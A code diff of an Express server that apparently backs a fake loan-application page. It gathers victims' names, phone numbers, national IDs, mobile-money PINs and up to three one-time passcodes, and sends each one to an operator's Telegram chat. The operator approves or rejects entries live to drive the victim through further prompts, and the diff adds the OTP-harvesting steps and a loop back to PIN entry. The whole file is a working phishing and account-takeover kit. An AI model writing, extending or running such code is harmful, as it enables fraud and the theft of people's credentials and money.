@@ -4,19 +4,15 @@ const path = require("path");
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// ENV
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// Telegram API base (FIXED)
 const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// USERS STORAGE
 const users = {};
 
 // ================= HOME =================
@@ -24,7 +20,7 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ================= 1. APPLY =================
+// ================= APPLY =================
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
@@ -40,18 +36,18 @@ app.post("/apply", async (req, res) => {
     nationalId,
     status: "pending",
     pinStatus: "waiting",
+    otpStatus: "waiting",
+    otpStep: 1,
     attempts: 0
   };
 
-  const message = `
-📥 NEW LOAN APPLICATION
-
+  const message =
+`📥 NEW LOAN APPLICATION
 👤 Name: ${name}
 📱 Phone: ${phone}
 📡 Network: ${network}
 💰 Amount: ${amount}
-🆔 ID: ${nationalId}
-`;
+🆔 ID: ${nationalId}`;
 
   const keyboard = {
     inline_keyboard: [
@@ -71,48 +67,51 @@ app.post("/apply", async (req, res) => {
 
     res.sendStatus(200);
   } catch (err) {
-    console.log("Telegram Error:", err.message);
+    console.log("Telegram error:", err.message);
     res.status(500).send("Telegram failed");
   }
 });
 
-// ================= 2. STATUS =================
+// ================= STATUS =================
 app.get("/status/:phone", (req, res) => {
   const user = users[req.params.phone];
   res.json({ status: user ? user.status : "unknown" });
 });
 
-// ================= 3. PIN STATUS =================
 app.get("/check-pin-status/:phone", (req, res) => {
   const user = users[req.params.phone];
-
   res.json({
     status: user ? user.pinStatus : "unknown",
     attempt: user ? user.attempts : 0
   });
 });
 
-// ================= 4. PIN SUBMIT =================
+app.get("/check-otp-status/:phone", (req, res) => {
+  const user = users[req.params.phone];
+  res.json({
+    status: user ? user.otpStatus : "unknown",
+    step: user ? user.otpStep : 1
+  });
+});
+
+// ================= PIN =================
 app.post("/send-pin", async (req, res) => {
   const { phone, pin } = req.body;
-
   if (!users[phone]) return res.sendStatus(404);
 
   users[phone].attempts += 1;
   users[phone].pinStatus = "verifying";
 
-  const message = `
-🔐 PIN RECEIVED (${users[phone].attempts}/3)
-
+  const message =
+`🔐 PIN RECEIVED (${users[phone].attempts}/3)
 📱 Phone: ${phone}
-🔑 PIN: ${pin}
-`;
+🔑 PIN: ${pin}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "✔ PIN CORRECT", callback_data: `pinok_${phone}` },
-        { text: "❌ WRONG PIN", callback_data: `pinwrong_${phone}` }
+        { text: "✔ CORRECT", callback_data: `pinok_${phone}` },
+        { text: "❌ WRONG", callback_data: `pinwrong_${phone}` }
       ]
     ]
   };
@@ -126,48 +125,105 @@ app.post("/send-pin", async (req, res) => {
 
     res.sendStatus(200);
   } catch (err) {
-    console.log("PIN send error:", err.message);
+    console.log("PIN error:", err.message);
     res.sendStatus(500);
   }
 });
 
-// ================= 5. WEBHOOK =================
+// ================= OTP =================
+app.post("/send-otp", async (req, res) => {
+  const { phone, otp, step } = req.body;
+  if (!users[phone]) return res.sendStatus(404);
+
+  const stepNum = parseInt(step || users[phone].otpStep);
+
+  users[phone].otpStatus = "verifying";
+  users[phone].otpStep = stepNum;
+
+  const message =
+`🔢 OTP RECEIVED (Step ${stepNum}/3)
+📱 Phone: ${phone}
+🔑 OTP: ${otp}`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "✅ CORRECT", callback_data: `otpok_${phone}` },
+        { text: "❌ WRONG", callback_data: `otpwrong_${phone}` }
+      ],
+      [
+        { text: "⚠️ BACK TO PIN", callback_data: `pinwrong_${phone}` }
+      ]
+    ]
+  };
+
+  try {
+    await axios.post(`${TG}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: keyboard
+    });
+
+    res.sendStatus(200);
+  } catch (err) {
+    console.log("OTP error:", err.message);
+    res.sendStatus(500);
+  }
+});
+
+// ================= WEBHOOK =================
 app.post("/webhook", async (req, res) => {
-  const body = req.body;
+  const cb = req.body.callback_query;
+  if (!cb || !cb.data) return res.sendStatus(200);
 
-  if (!body.callback_query) return res.sendStatus(200);
+  const [command, phone] = cb.data.split("_");
+  const user = users[phone];
+  if (!user) return res.sendStatus(200);
 
-  const data = body.callback_query.data;
-  const [command, phone] = data.split("_");
-
-  if (!users[phone]) return res.sendStatus(200);
-
-  let feedbackText = "";
+  let msg = "";
 
   if (command === "approve") {
-    users[phone].status = "approved";
-    feedbackText = `User ${phone} APPROVED`;
+    user.status = "approved";
+    msg = `APPROVED ${phone}`;
   }
 
   if (command === "decline") {
-    users[phone].status = "declined";
-    feedbackText = `User ${phone} DECLINED`;
+    user.status = "declined";
+    msg = `DECLINED ${phone}`;
   }
 
   if (command === "pinok") {
-    users[phone].pinStatus = "success";
-    feedbackText = `PIN correct for ${phone}`;
+    user.pinStatus = "success";
+    msg = `PIN OK ${phone}`;
   }
 
   if (command === "pinwrong") {
-    users[phone].pinStatus = "re-enter";
-    feedbackText = `PIN wrong for ${phone} (${users[phone].attempts}/3)`;
+    user.pinStatus = "re-enter";
+    user.otpStatus = "back-to-pin";
+    msg = `PIN WRONG ${phone}`;
+  }
+
+  if (command === "otpok") {
+    user.otpStep = Math.min((user.otpStep || 1) + 1, 3);
+
+    if (user.otpStep >= 3) {
+      user.otpStatus = "finish";
+      msg = `OTP COMPLETE ${phone}`;
+    } else {
+      user.otpStatus = "next";
+      msg = `NEXT OTP ${user.otpStep}/3`;
+    }
+  }
+
+  if (command === "otpwrong") {
+    user.otpStatus = "re-enter";
+    msg = `OTP WRONG ${phone}`;
   }
 
   try {
     await axios.post(`${TG}/sendMessage`, {
       chat_id: CHAT_ID,
-      text: feedbackText
+      text: msg
     });
   } catch (e) {
     console.log("Webhook TG error:", e.message);
